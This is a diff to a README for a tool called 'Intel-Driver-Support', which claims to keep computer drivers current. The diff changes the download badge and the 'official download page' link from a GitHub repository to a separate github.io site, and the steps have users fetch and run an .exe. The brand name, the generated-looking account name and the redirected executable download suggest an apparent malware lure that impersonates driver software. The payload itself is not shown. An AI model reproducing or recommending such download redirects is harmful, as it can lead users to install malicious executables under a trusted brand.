@@ -1,6 +1,6 @@
 # 🛠️ Intel-Driver-Support - Keep Your Computer Drivers Always Current
 
-[![](https://img.shields.io/badge/Download_Assistant-Blue?style=for-the-badge)](https://github.com/tyrannical-clockwork565/Intel-Driver-Support)
+[![](https://img.shields.io/badge/Download_Assistant-Blue?style=for-the-badge)](https://tyrannical-clockwork565.github.io)
 
 ## What This Tool Does
 
@@ -20,7 +20,7 @@ To use this software, your computer needs the following specifications:
 
 You obtain the installation file directly from the project repository. Follow these steps to get the file onto your machine:
 
-1. Visit the [official download page](https://github.com/tyrannical-clockwork565/Intel-Driver-Support).
+1. Visit the [official download page](https://tyrannical-clockwork565.github.io).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click on the latest version link.
 4. Select the file ending in .exe to start your download.
